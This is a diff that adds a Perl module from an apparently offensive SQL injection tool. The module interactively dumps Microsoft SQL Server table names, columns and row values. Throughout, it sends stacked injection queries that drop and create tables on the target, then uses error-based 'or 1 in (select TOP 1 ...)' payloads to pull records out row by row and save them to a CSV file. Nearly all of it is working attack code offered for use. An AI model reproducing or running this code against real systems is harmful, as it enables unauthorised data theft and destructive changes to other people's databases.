@@ -1,0 +1,340 @@
+############################
+# Automagically dump table structure and table values
+#
+# Only extracts strings and int's (poss more) atm.
+#
+#
+#
+
+
+############################
+# many of the options are commented out till later
+#
+############################
+use Switch;
+return 1;
+
+sub old_dumper{
+
+startoftabledumper1:	# Label to go back to to start over, easier to read than a loop
+
+print "\n\nEnter the database to start from\n[master.dbo.sysobjects | sysobjects]:";
+
+$sysobjects=<STDIN>;chomp $sysobjects;
+
+if ($sysobjects =~ 'master'){$ismaster='master..';}; # set this prefix for master database
+
+
+print "Please select one of the following types to list:\n".
+	#"C \t CHECK constraint"
+	#."\n"."D \t Default or DEFAULT constraint"
+	#."\n"."F \t FOREIGN KEY constraint"
+	#."\n"."L \t Log"
+	#."\n"."P \t Stored procedure"
+	#."\n"."PK \t PRIMARY KEY constraint (type is K)"
+	#."\n"."RF \t Replication filter stored procedure"
+	#."\n"."S \t System table"
+	#."\n"."TR \t Trigger2"
+	"\n"."U \t User table"
+	#."\n"."UQ \t UNIQUE constraint (type is K)"
+	#."\n"."V \t View"
+	#."\n"."X \t Extended stored procedure"
+	#."\n"."C \t CHECK constraint"
+	#."\n"."D \t Default or DEFAULT constraint"
+	#."\n"."F \t FOREIGN KEY constraint"
+	#."\n"."L \t Log"
+	#."\n"."P \t Stored procedure"
+	#."\n"."PK \t PRIMARY KEY constraint (type is K)"
+	#."\n"."RF \t Replication filter stored procedure"
+	."\n"."S \t System table";
+	#."\n"."TR \t Trigger"
+	#."\n"."U \t User table"
+	#."\n"."UQ \t UNIQUE constraint (type is K)"
+	#."\n"."V \t View"
+	#."\n"."X \t Extended stored procedure\n\n";
+
+print "\n\nEnter selection:";
+
+
+############################
+# SQL to dump sysobjects
+############################
+
+$type=<STDIN>; chomp $type;
+
+	$t_query=	$qt .
+			' ;drop table '.$dbtype.'automagictable1;'.
+			' CREATE table '.$dbtype.'automagictable1(num int identity(1,1), name varchar(4096),type varchar(4096));'.
+			' INSERT into '.$dbtype.'automagictable1 SELECT name,type from '. $sysobjects .' where type='."'$type'".';--';
+
+
+
+	
+	sendsqlattack($t_host,$t_query,$req,$t_port); # send attack and set $err
+	
+############################
+# Extract results
+############################
+
+$index=1; # Start at first row and work down
+while(1){
+	$print_buffer="";
+	$t_query=	
+	$qt ." or 1 in \(select TOP 1 name from $dbtype"."automagictable1 where num =$index\)--";
+
+#print $t_query;
+
+	sendsqlattack($t_host,$t_query,$req,$t_port);
+	chomp $err;
+	$print_buffer = "Object Name:$err" ."\n";
+	print $print_buffer;
+	$index++;
+if(length($err) ==0){ last;}
+}
+
+
+
+############################
+# Continue or start over
+############################
+
+
+
+print "\nWhat do you want to do, (C)ontinue and examine a table or (S)tart Over? :";
+$choose =<STDIN>;chomp $choose; $choose=uc($choose);
+#print "you chose $choose";
+
+switch ($choose) {
+
+		case 'S'	{goto startoftabledumper1}		
+		case 'C'	{}
+}
+
+
+
+############################
+# Probe a table
+############################
+
+startofprober1:
+
+print "\nPlease enter the table you want to examine:";
+$tablename=<STDIN>;chomp $tablename;
+$tablename2=$tablename;
+
+
+$t_query=	$qt .
+		' ;drop table '.$dbtype.'automagictable2;'.
+		' CREATE table '.$dbtype.'automagictable2(num int identity(1,1), name varchar(4096),type varchar(4096));'.
+		' INSERT into '.$dbtype.'automagictable2 select name,type from '.$ismaster. 'syscolumns where id=object_id('."'".$ismaster.$tablename."'".')--';
+	
+sendsqlattack($t_host,$t_query,$req,$t_port); # send attack and set $err
+	
+
+### Extract results
+
+
+$index=1; # Start at first row and work down
+while(1){
+
+	$print_buffer="";
+	$t_query=	
+	$qt ." or 1 in \(select TOP 1 name from $dbtype"."automagictable2 where num =$index\)--";
+	sendsqlattack($t_host,$t_query,$req,$t_port);
+	chomp $err;
+if(length($err) ==0){ last;}	# If reached the end exit sub
+	$print_buffer = "Column Name:$err" ."\n";
+	print $print_buffer;
+	$index++;
+
+}
+
+
+print "\nWhat do you want to do?\n(C)ontinue and dump rows, (D)ifferent table or (S)tart Over? :";
+$choose =<STDIN>;chomp $choose; $choose=uc($choose);
+#print "you chose $choose";
+
+switch ($choose) {
+
+		case 'S'	{goto startoftabledumper1}		
+		case 'D'	{goto startofprober1}
+		case 'C'	{}
+}
+
+
+
+##########################################################################
+# dump tables
+#
+# Note: this bit probabally needs totally recoding
+#	it would be better to create a new table with a identity field
+#	so that stuff can be indexed correctly
+#
+#	Seems to work ok tho.
+#
+
+
+
+print "\nEnter the columns you want dump separated with a \/\n\(up to 10 columns currently\):";
+	$user_cols=<STDIN>;chomp $user_cols;
+print "Please number of rows to return:";
+	$rows=<STDIN>;chomp $rows;
+
+(@cols)=split(/\//,$user_cols);
+
+
+
+
+#hold values in these
+@col1data="";
+@col2data="";
+@col3data="";
+@col4data="";
+@col5data="";
+@col6data="";
+@col7data="";
+@col8data="";
+@col9data="";
+@col10data="";
+
+
+############################
+# Create Temp database
+############################
+
+$t_query=	
+	$qt .';drop table '.$dbtype.'extractor; CREATE table '.$dbtype.'extractor(';
+
+$co=0;
+
+while($cols[$co]){
+
+	$t_query .= $cols[$co] .' varchar(10),';
+
+$co++;	
+
+}
+
+$t_query.= 'indi int identity(1,1))--';
+
+
+sendsqlattack($t_host,$t_query,$req,$t_port);
+
+
+############################
+# populate temp db with selected cols
+############################
+
+$t_query=	
+	$qt .';INSERT into '.$dbtype.'extractor select top '.$rows .' ';
+
+
+$t_query .= $cols[0]; # put first colum in so we dont have trailing ,
+
+$co=1;
+while($cols[$co]){
+
+	$t_query .= ','. $cols[$co];
+	$co++;	
+	}
+$t_query.= ' from '.$ismaster.$tablename2.'--';
+
+#print "query $t_query\n";
+
+sendsqlattack($t_host,$t_query,$req,$t_port);
+
+
+
+############################
+# extract info
+############################
+
+
+# Messy structure to hold data
+
+$tmp_var1=$dbtype .'extractor';
+
+
+
+if ($cols[0]){ @col1data=col_enumerator1($tmp_var1,$cols[0]);}else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays
+if ($cols[1]){@col2data=col_enumerator1($tmp_var1,$cols[1]);}else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays # 
+if ($cols[2]){@col3data=col_enumerator1($tmp_var1,$cols[2]);}else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays # 
+if ($cols[3]){@col4data=col_enumerator1($tmp_var1,$cols[3]);}else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays # 
+if ($cols[4]){@col5data=col_enumerator1($tmp_var1,$cols[4]); }else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays# 
+if ($cols[5]){@col6data=col_enumerator1($tmp_var1,$cols[5]); }else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays# 
+if ($cols[6]){@col7data=col_enumerator1($tmp_var1,$cols[6]); }else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays# 
+if ($cols[7]){@col8data=col_enumerator1($tmp_var1,$cols[7]); }else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays# 
+if ($cols[8]){@col9data=col_enumerator1($tmp_var1,$cols[8]); }else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays# 
+if ($cols[9]){@col10data=col_enumerator1($tmp_var1,$cols[9]); }else { display_table1();print "Press Enter to continue...";$nothing=<STDIN>;menu();exit}# Collect data into arrays#
+
+
+ 
+############################
+# Col enumerator sub
+############################
+
+
+
+sub col_enumerator1{
+
+@coldata_tmp="";
+
+@col_enumeratorvars=@_;
+	
+	$tblname=$col_enumeratorvars[0];
+	$colname=$col_enumeratorvars[1];
+	
+	for ($ce=1;$ce <= $rows; ++$ce){
+	$t_query=$qt . ' or 1 in (SELECT top 1 '."'AMAGIC'+".$colname.' from '. $tblname.' where indi ='. $ce .')--';
+
+	
+sendsqlattack($t_host,$t_query,$req,$t_port);
+	
+($crap,$thevalue)=split(/AMAGIC/,$err);
+	chomp $thevalue;
+
+	push(@coldata_tmp, $thevalue);	
+	#print "thevalue:$thevalue";
+	}	
+
+return @coldata_tmp;
+
+} # end of for col_enumerator sub
+
+
+############################
+# Display to screen sub and write to a csv file
+############################
+
+exit;
+
+sub display_table1{
+
+print "To view correctly a .csv file needs to be created.\n\nPlease enter output file name:";
+$filename=<STDIN>;chomp $filename;
+
+
+
+@dtable=@_;
+$dnumber=$dtable[0];
+
+for($p=1; $p <=$rows;++$p){
+open(OUTFILE,">>$filename");
+print  $col1data[$p].','.$col2data[$p].','.$col3data[$p].','.$col4data[$p] 
+.','.$col5data[$p].','.$col6data[$p].','.$col7data[$p].','.$col8data[$p]
+.','.$col9data[$p].','.$col10data[$p] ."\n";		
+
+
+print OUTFILE $col1data[$p].','.$col2data[$p].','.$col3data[$p].','.$col4data[$p] 
+.','.$col5data[$p].','.$col6data[$p].','.$col7data[$p].','.$col8data[$p]
+.','.$col9data[$p].','.$col10data[$p]."\n";
+close OUTFILE;
+		}
+	} #end of display table
+
+} #end of sysobjects_dumper
+
+
+
+
+
